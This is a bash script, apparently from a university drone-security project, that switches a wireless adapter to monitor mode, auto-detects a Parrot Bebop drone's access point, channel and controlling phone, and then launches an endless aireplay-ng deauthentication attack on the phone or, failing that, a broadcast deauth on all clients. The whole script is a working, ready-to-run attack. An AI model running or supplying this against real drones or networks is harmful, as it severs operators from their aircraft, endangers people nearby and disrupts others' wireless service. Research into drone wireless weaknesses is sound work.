#!/bin/bash

IFACE="wlx00c0cabe245c"
BSSID="${BSSID:-}"             # auto-detected below; or export BSSID=AA:BB:..
SSID_PREFIX="${SSID_PREFIX:-BebopDrone}"
VENV="/home/sakar/UNR_Projects/BebopDrone/.venv37/bin/python3"
FINDER="/home/sakar/UNR_Projects/BebopDrone/find_phone.py"
DRONEFINDER="/home/sakar/UNR_Projects/BebopDrone/find_drone.py"

# Define cleanup function to kill all background processes on Ctrl+C
cleanup() {
    echo -e "\n[+] Caught Ctrl+C! Stopping all background processes cleanly..."
    # Kill all background jobs started by this script shell
    kill $(jobs -p) 2>/dev/null
    exit 0
}

# Set the trap at the beginning to catch Ctrl+C (SIGINT)
trap cleanup SIGINT

# 1. Put the interface into monitor mode
echo "[+] Setting $IFACE to monitor mode..."
sudo ip link set "$IFACE" down
sudo iw dev "$IFACE" set type monitor
sudo ip link set "$IFACE" up

# 2. Auto-detect the drone's BSSID + channel in one scan (SSID prefix or Parrot
#    OUI). Override by exporting BSSID=.. / CHANNEL=..; manual fallback below.
channel_num="${CHANNEL:-}"
if [ -z "$BSSID" ] || [ -z "$channel_num" ]; then
    echo "[+] Auto-detecting the drone (SSID '$SSID_PREFIX*')..."
    read -r DET_BSSID DET_CH < <(sudo "$VENV" "$DRONEFINDER" "$IFACE" "$SSID_PREFIX")
    [ -z "$BSSID" ] && BSSID="$DET_BSSID"
    [ -z "$channel_num" ] && channel_num="$DET_CH"
fi
if [ -z "$BSSID" ] || [ -z "$channel_num" ]; then
    echo "[!] Auto-detect failed. Manual scan — find your target, then Ctrl-C."
    sudo airodump-ng "$IFACE"
    echo ""
    [ -z "$BSSID" ] && read -p "Enter drone BSSID (MAC): " BSSID
    [ -z "$channel_num" ] && read -p "Enter the target channel number: " channel_num
fi

# 3. Lock the adapter to that channel (find_phone + deauth both need this)
sudo iw dev "$IFACE" set channel "$channel_num"
echo "[+] Drone $BSSID — locked to channel $channel_num."

# 4. Auto-detect the phone's (randomized) MAC — the busiest station in the
#    drone's BSS. No need to read it off airodump by hand anymore.
echo "[+] Detecting the phone's MAC..."
PHONE_MAC="$(sudo "$VENV" "$FINDER" "$IFACE" "$BSSID")"

# 6. Launch the deauth attack against the detected client (or broadcast if the
#    phone wasn't seen — that still hits every client of the AP).
echo "[+] Starting aireplay-ng deauth attack..."
echo "[+] Press [CTRL+C] at any time to exit and stop all attacks perfectly."
if [ -n "$PHONE_MAC" ]; then
    echo "[+] Target: $PHONE_MAC"
    sudo aireplay-ng --deauth 0 -a "$BSSID" -c "$PHONE_MAC" "$IFACE"
else
    echo "[!] Phone not detected — falling back to broadcast deauth."
    sudo aireplay-ng --deauth 0 -a "$BSSID" "$IFACE"
fi

# If aireplay-ng exits on its own, trigger the cleanup function anyway
cleanup
